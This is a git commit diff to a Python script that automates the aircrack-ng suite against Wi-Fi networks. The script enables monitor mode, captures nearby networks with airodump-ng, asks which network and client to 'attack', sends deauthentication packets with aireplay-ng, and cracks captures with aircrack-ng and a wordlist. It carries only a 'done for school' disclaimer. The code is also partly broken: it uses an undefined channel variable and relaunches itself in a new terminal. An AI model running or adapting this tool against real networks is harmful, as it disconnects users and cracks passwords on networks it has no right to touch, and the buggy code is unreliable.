e083e426ce3b14250e18bf209d8abcae581b6580
Alex <alexzele.b@gmail.com>
2019-08-17 00:24:59 +0300

    file input/output use

--- airmon_auto.py
+++ airmon_auto.py
@@ -1,12 +1,14 @@
 from os import system
+import os
 import subprocess as sub
 import time
 import csv
 import re
 
-
 wireless_card = 'wlan0'
 mon_card = wireless_card + 'mon'
+file = 'data'
+
 
 def if_config(wireless_card):
     ifconfig = 'ifconfig {0} up'.format(wireless_card)
@@ -17,38 +19,40 @@ def if_config(wireless_card):
     time.sleep(1)
 
 
-def air_mon(wireless_card):
+def air_mon(wireless_card, channel=None):
     # airkill = 'airmon-ng check kill'
     # system(airkill)
-    airmon = 'airmon-ng start {0}'.format(wireless_card)
+    airmon = 'airmon-ng start {0} {1}'.format(wireless_card, channel)
     system(airmon)
     time.sleep(1)
 
 
-def airodump_ng(mon_card):
+def airodump_ng(mon_card, file):
     airodump = 'airodump-ng {0}'.format(mon_card)
-    cmd = "timeout 30s  "+ airodump + " -w file_airo --output-format csv "
-    print cmd
-    p= sub.Popen(['airodump-ng','wla n0mon', '-w file_a --output-format csv'])
-    time.sleep(30)
+    # cmd =  airodump + " -w file_airo --output-format csv "
+    # print cmd
+    p = sub.Popen(['airodump-ng', 'wlan0mon', '-w' + file])
+    time.sleep(10)
     p.kill()
 
 
-def beacons_snif(bssid, ch, essid):
-    airodump_snif= 'a irodump-ng --bssid {0} -c {1} --write beacons{2} '.format(bssid,ch,essid)
-    # system(airodump_snif)
-    p= sub.Popen(['airodump-ng','wla n0mon','--b ssid',bssid, '-c',ch, '-w beacons --output-format txt'])
-    # p= sub.Popen(['airodump-ng','--bssid{Bss}', '--write beacons{essid}'])
-    # p.format
-    time.sleep(30)
-    p.kill()
+# def beacons_snif(bssid, ch, essid):
+#    airodump_snif= 'a irodump-ng --bssid {0} -c {1} --write beacons{2} '.format(bssid,ch,essid)
+#    # system(airodump_snif)
+#    p= sub.Popen(['airodump-ng','wla n0mon','--b ssid',bssid, '-c',ch, '-w beacons --output-format txt'])
+# p= sub.Popen(['airodump-ng','--bssid{Bss}', '--write beacons{essid}'])
+# p.format
+#    time.sleep(30)
+#    p.kill()
 
 
 def aire_play(bssid, station):
-    p_aire_play = sub.Popen(['aireplay-ng','--de auth 15','--bssid', bssid,'-c', station, mon_card])
+    p_aire_play = sub.Popen(['aireplay-ng', '--deauth 15', '-a', bssid, '-c', station, mon_card])
+
 
 def air_crack(file, path_to_list):
-    p_aire_play = sub.Popen(['aircrack-ng', file,'-w', path_to_list])
+    p_aire_play = sub.Popen(['aircrack-ng', file, '-w', path_to_list])
+
 
 def parse_csv(file, *fnames):
     names = []
@@ -62,7 +66,7 @@ def parse_csv(file, *fnames):
     for line in df:
         t = {}
         for fname in fnames:
-            name = ' ' + fname if fname not in line.keys() else fname
+            name = fname if fname not in line.keys() else fname
             if name not in line.keys():
                 continue
             t[fname] = line[name].strip()
@@ -73,31 +77,37 @@ def parse_csv(file, *fnames):
 def main():
     print("This Project Have been done For School , you use its on our own resbonsiblity")
 
-  #  #wireless_card= raw_input("Enter oyur wirless card :")
-    wireless_card = 'wlan0'
-    mon_card = wireless_card + 'mon'
+    #  #wireless_card= raw_input("Enter oyur wirless card :")
+
+    if os.path.exists('./data-01.csv'):
+        os.remove('./data-01.csv')
+        os.remove('./data-01.cap')
+        os.remove('./data-01.kismet.netxml')
+        os.remove('./data-01.log.csv')
+        os.remove('./data-01.kismet.csv')
+
+    print(wireless_card)
+    print(mon_card)
     if_config(wireless_card)
     air_mon(wireless_card)
-    sub.call(['gnome-terminal']) #open new shell?
-    airodump_ng(mon_card)
-    #beacons_snif('EC:41:18:16:59:86', '2' ,'xiaomi')
+    system('xfce4-terminal --tab python airmon_auto.py')  # open new shell?
+    airodump_ng(mon_card, file)
+    work_file = ('data-01.csv')
+    data = parse_csv(work_file, 'BSSID', 'channel', 'Station MAC')
 
-    data = parse_csv('ddddd.csv', 'BSSID', 'channel')
-    #print(data)
-    print(' \n '.join(map(str, data)))
-    data = parse_csv('111111.csv', 'BSSID', 'channel')
-    print(' \n '.join(map(str, data)))
-    #regex = r"\d\n+\d\d+\n\n+\n\d:\d\n+\d\d+\n\n+\n\d:\d\n+\d\d+\n\n+\n\d:\d\n+\d\d+\n\n+\n\d:\d\n+\d\d+\n\n+\n\d:\d\n+\d\d+\n\n+\n\d"
+    # print(data)
+    # print(' \n '.join(map(str, data)))
+    # regex = r"\d\n+\d\d+\n\n+\n\d:\d\n+\d\d+\n\n+\n\d:\d\n+\d\d+\n\n+\n\d:\d\n+\d\d+\n\n+\n\d:\d\n+\d\d+\n\n+\n\d:\d\n+\d\d+\n\n+\n\d"
 
     bssid = raw_input("Enter the lan that you would like to attack :")
-    staion = raw_input("Enter the lan that you would like to attack :")
+    staion = raw_input("Enter the station :")
+    air_mon(wireless_card, channel)
+    # TODO implement station of this bssid
+
+    aire_play(bssid, staion)
 
 
-    #TODO implement station of this bssid
-
-
-    aire_play((bssid,staion))
-   #TODO implement ival of input???
+# TODO implement ival of input???
 
 
 if __name__ == '__main__':
